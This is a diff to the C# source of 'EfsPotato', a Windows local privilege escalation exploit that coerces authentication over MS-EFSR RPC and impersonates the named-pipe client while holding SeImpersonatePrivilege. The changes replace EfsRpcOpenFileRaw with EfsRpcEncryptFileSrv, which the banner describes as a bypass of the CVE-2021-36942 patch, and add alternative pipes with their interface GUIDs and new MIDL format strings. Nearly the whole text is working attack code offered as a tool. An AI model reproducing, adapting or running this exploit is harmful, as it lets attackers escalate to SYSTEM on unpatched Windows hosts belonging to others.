@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Text;
 using System.Runtime.InteropServices;
@@ -8,22 +8,40 @@ using System.Security.Permissions;
 using System.Diagnostics;
 using System.Threading;
 using System.Security.Principal;
+using System.Linq;
 using Microsoft.Win32.SafeHandles;
 
 namespace Zcg.Exploits.Local
 {
     class EfsPotato
     {
+        static void usage()
+        {
+            Console.WriteLine("usage: EfsPotato <cmd> [pipe]");
+            Console.WriteLine("  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)\r\n");
+        }
         static void Main(string[] args)
         {
             Console.WriteLine("Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).");
-            Console.WriteLine("Part of GMH's fuck Tools, Code By zcgonvh.\r\n");
+            Console.WriteLine("Part of GMH's fuck Tools, Code By zcgonvh.");
+            Console.WriteLine("CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]\r\n");
             if (args.Length < 1)
             {
-                Console.WriteLine("usage: EfsPotato <cmd>");
-                Console.WriteLine();
+                usage();
                 return;
             }
+            string pipe = "lsarpc";
+            if (args.Length >= 2)
+            {
+                if ((new List<string> { "lsarpc", "efsrpc", "samr", "lsass", "netlogon" }).Contains(args[1], StringComparer.OrdinalIgnoreCase)){
+                    pipe = args[1];     
+                }
+                else {
+                    usage();
+                    return;
+                }
+            }
+            
             LUID_AND_ATTRIBUTES[] l = new LUID_AND_ATTRIBUTES[1];
             using (WindowsIdentity wi = WindowsIdentity.GetCurrent())
             {
@@ -53,8 +71,8 @@ namespace Zcg.Exploits.Local
             tn.Start(new object[] { hPipe, mre });
             var tn2 = new Thread(RpcThread);
             tn2.IsBackground = true;
-            tn2.Start(g);
-            if (mre.WaitOne(1000))
+            tn2.Start(new object[] { g, pipe });
+            if (mre.WaitOne(3000))
             {
                 if (ImpersonateNamedPipeClient(hPipe))
                 {
@@ -111,12 +129,13 @@ namespace Zcg.Exploits.Local
         }
         static void RpcThread(object o)
         {
-            string g = o as string;
-            EfsrTiny r = new EfsrTiny();
-            IntPtr hHandle = IntPtr.Zero;
+            object[] objs = o as object[];
+            string g = objs[0] as string;
+            string p = objs[1] as string;
+            EfsrTiny r = new EfsrTiny(p);
             try
             {
-                r.EfsRpcOpenFileRaw(out hHandle, "\\\\localhost/PIPE/" + g + "/\\" + g + "\\" + g, 0);
+                r.EfsRpcEncryptFileSrv("\\\\localhost/PIPE/" + g + "/\\" + g + "\\" + g);
             }
             catch (Exception ex)
             {
@@ -251,26 +270,38 @@ namespace Zcg.Exploits.Local
         private static extern Int32 RpcBindingSetOption(IntPtr Binding, UInt32 Option, IntPtr OptionValue);
 
         [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
-        internal static extern IntPtr NdrClientCall2x64(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr binding, out IntPtr hContext, string FileName, int Flags);
+        internal static extern IntPtr NdrClientCall2x64(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr binding, string FileName);
 
-        private static byte[] MIDL_ProcFormatStringx86 = new byte[] { 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x40, 0x00, 0x46, 0x04, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x01, 0x04, 0x00, 0x06, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x0c, 0x00, 0x08, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00, 0x00, 0x00 };
-
-        private static byte[] MIDL_ProcFormatStringx64 = new byte[] { 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x40, 0x00, 0x46, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x01, 0x08, 0x00, 0x06, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x18, 0x00, 0x08, 0x00, 0x70, 0x00, 0x20, 0x00, 0x08, 0x00, 0x00, 0x00 };
+        private static byte[] MIDL_ProcFormatStringx86 = new byte[] { 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x0c, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x02, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x04, 0x00, 0x0c, 0x00, 0x70, 0x00, 0x08, 0x00, 0x08, 0x00 };
+        
+        private static byte[] MIDL_ProcFormatStringx64 = new byte[] { 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x18, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x02, 0x0a, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00 };
 
         private static byte[] MIDL_TypeFormatStringx86 = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x08, 0x25, 0x5c, 0x00, 0x00 };
 
         private static byte[] MIDL_TypeFormatStringx64 = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x08, 0x25, 0x5c, 0x00, 0x00 };
         Guid interfaceId;
-        public EfsrTiny()
+        public EfsrTiny(string pipe)
         {
-            interfaceId = new Guid("c681d488-d850-11d0-8c52-00c04fd90f7e");
+            IDictionary<string, string> bindingMapping = new Dictionary<string, string>()
+            {
+                {"lsarpc", "c681d488-d850-11d0-8c52-00c04fd90f7e"},
+                {"efsrpc", "df1941c5-fe89-4e79-bf10-463657acf44d"},
+                {"samr", "c681d488-d850-11d0-8c52-00c04fd90f7e"},
+                {"lsass", "c681d488-d850-11d0-8c52-00c04fd90f7e"},
+                {"netlogon", "c681d488-d850-11d0-8c52-00c04fd90f7e"}
+            };
+            
+            interfaceId = new Guid(bindingMapping[pipe]);
+            
+            pipe = String.Format("\\pipe\\{0}", pipe);
+            Console.WriteLine("[+] Pipe: " + pipe);
             if (IntPtr.Size == 8)
             {
-                InitializeStub(interfaceId, MIDL_ProcFormatStringx64, MIDL_TypeFormatStringx64, "\\pipe\\lsarpc", 1, 0);
+                InitializeStub(interfaceId, MIDL_ProcFormatStringx64, MIDL_TypeFormatStringx64, pipe, 1, 0);
             }
             else
             {
-                InitializeStub(interfaceId, MIDL_ProcFormatStringx86, MIDL_TypeFormatStringx86, "\\pipe\\lsarpc", 1, 0);
+                InitializeStub(interfaceId, MIDL_ProcFormatStringx86, MIDL_TypeFormatStringx86, pipe, 1, 0);
             }
         }
 
@@ -278,40 +309,26 @@ namespace Zcg.Exploits.Local
         {
             freeStub();
         }
-        public int EfsRpcOpenFileRaw(out IntPtr hContext, string FileName, int Flags)
+        public int EfsRpcEncryptFileSrv(string FileName)
         {
             IntPtr result = IntPtr.Zero;
             IntPtr pfn = Marshal.StringToHGlobalUni(FileName);
 
-            hContext = IntPtr.Zero;
             try
             {
                 if (IntPtr.Size == 8)
                 {
-                    result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(2), Bind(Marshal.StringToHGlobalUni("localhost")), out hContext, FileName, Flags);
+                    result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(2), Bind(Marshal.StringToHGlobalUni("localhost")), FileName);
                 }
                 else
                 {
-                    IntPtr tempValue = IntPtr.Zero;
-                    GCHandle handle = GCHandle.Alloc(tempValue, GCHandleType.Pinned);
-                    IntPtr tempValuePointer = handle.AddrOfPinnedObject();
-                    try
-                    {
-                        result = CallNdrClientCall2x86(2, Bind(Marshal.StringToHGlobalUni("localhost")), tempValuePointer, pfn, IntPtr.Zero);
-                        // each pinvoke work on a copy of the arguments (without an out specifier)
-                        // get back the data
-                        hContext = Marshal.ReadIntPtr(tempValuePointer);
-                    }
-                    finally
-                    {
-                        handle.Free();
-                    }
+                    result = CallNdrClientCall2x86(2, Bind(Marshal.StringToHGlobalUni("localhost")), pfn);
                 }
             }
             catch (SEHException)
             {
                 int err = Marshal.GetExceptionCode();
-                Console.WriteLine("[x]EfsRpcOpenFileRaw failed: " + err);
+                Console.WriteLine("[x] EfsRpcEncryptFileSrv failed: " + err);
                 return err;
             }
             finally
@@ -394,23 +411,23 @@ namespace Zcg.Exploits.Local
             status = RpcStringBindingCompose(interfaceId.ToString(), "ncacn_np", server, PipeName, null, out bindingstring);
             if (status != 0)
             {
-                Console.WriteLine("[x]RpcStringBindingCompose failed with status 0x" + status.ToString("x"));
+                Console.WriteLine("[x] RpcStringBindingCompose failed with status 0x" + status.ToString("x"));
                 return IntPtr.Zero;
             }
             status = RpcBindingFromStringBinding(Marshal.PtrToStringUni(bindingstring), out binding);
             RpcBindingFree(ref bindingstring);
             if (status != 0)
             {
-                Console.WriteLine("[x]RpcBindingFromStringBinding failed with status 0x" + status.ToString("x"));
+                Console.WriteLine("[x] RpcBindingFromStringBinding failed with status 0x" + status.ToString("x"));
                 return IntPtr.Zero;
             }
 
             status = RpcBindingSetOption(binding, 12, new IntPtr(RPCTimeOut));
             if (status != 0)
             {
-                Console.WriteLine("[x]RpcBindingSetOption failed with status 0x" + status.ToString("x"));
+                Console.WriteLine("[x] RpcBindingSetOption failed with status 0x" + status.ToString("x"));
             }
-            Console.WriteLine("[!]binding ok (handle=" + binding.ToString("x") + ")");
+            Console.WriteLine("[!] binding ok (handle=" + binding.ToString("x") + ")");
             return binding;
         }
 
